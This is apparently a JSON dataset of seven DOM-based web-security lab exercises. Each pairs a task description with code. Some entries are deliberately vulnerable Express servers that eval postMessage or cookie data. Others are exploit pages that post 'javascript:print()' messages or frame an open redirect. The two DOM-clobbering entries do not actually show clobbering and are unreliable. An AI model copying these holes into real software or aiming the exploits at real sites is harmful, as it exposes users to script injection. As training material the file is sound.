[
    
  {
    "Lab scenario": "DOM XSS using web messages",
    "Lab Description": "This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h1>DOM XSS Lab</h1>\n        <script>\n            window.addEventListener('message', (event) => {\n                eval(event.data);\n            });\n        </script>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});",
    "lab level": "Medium"
  },
  {
    "Lab scenario": "DOM XSS using web messages and a JavaScript URL",
    "Lab Description": "This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h1>DOM XSS Lab</h1>\n        <script>\n            window.addEventListener('message', (event) => {\n                window.location = event.data;\n            });\n        </script>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});",
    "lab level": "Medium"
  },
  {
    "Lab scenario": "DOM XSS using web messages and JSON.parse",
    "Lab Description": "This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n    <iframe id=\"targetFrame\" src=\"https://vulnerable-website.com/\"></iframe>\n    <script>\n        document.getElementById(\"targetFrame\").onload = function() {\n            document.getElementById(\"targetFrame\").contentWindow.postMessage(\n                '{\"url\": \"javascript:print()\"}', '*'\n            );\n        };\n    </script>\n</body>\n</html>",
    "lab level": "Medium"
  },
  {
    "Lab scenario": "DOM-based open redirection",
    "Lab Description": "This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n    <iframe id=\"targetFrame\" src=\"https://vulnerable-website.com/redirect.html?next=https://exploit-server.com\"></iframe>\n</body>\n</html>",
    "lab level": "Medium"
  },
  {
    "Lab scenario": "DOM-based cookie manipulation",
    "Lab Description": "This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n    res.send(`\n        <h1>DOM-based Cookie Manipulation Lab</h1>\n        <script>\n            document.cookie = 'cookieName=' + window.location.hash.slice(1);\n        </script>\n    `);\n});\n\napp.get('/vulnerable', (req, res) => {\n    res.send(`\n        <h1>Vulnerable Page</h1>\n        <script>\n            const cookieValue = document.cookie.split('; ').find(row => row.startsWith('cookieName=')).split('=')[1];\n            eval(cookieValue);\n        </script>\n    `);\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n    console.log(`Lab running on http://localhost:${PORT}`);\n});",
    "lab level": "Hard"
  },
  {
    "Lab scenario": "Exploiting DOM clobbering to enable XSS",
    "Lab Description": "This lab contains a DOM-clobbering vulnerability. The comment functionality allows \"safe\" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n    <form id=\"commentForm\">\n        <input type=\"text\" name=\"username\" value=\"victim\">\n        <textarea name=\"comment\"></textarea>\n        <input type=\"submit\">\n    </form>\n    <script>\n        var form = document.getElementById('commentForm');\n        form.submit = function() {\n            alert('XSS via DOM Clobbering!');\n        };\n    </script>\n</body>\n</html>",
    "lab level": "Medium"
  },
  {
    "Lab scenario": "Clobbering DOM attributes to bypass HTML filters",
    "Lab Description": "This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.",
    "Vulnerability name": "DOM-based vulnerabilities",
    "src code": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Exploit</title>\n</head>\n<body>\n    <form id=\"commentForm\">\n        <input type=\"text\" name=\"username\" value=\"victim\">\n        <textarea name=\"comment\"></textarea>\n        <input type=\"submit\">\n    </form>\n    <script>\n        var form = document.getElementById('commentForm');\n        form.submit = function() {\n            print();\n        };\n    </script>\n</body>\n</html>",
    "lab level": "Hard"
  }
]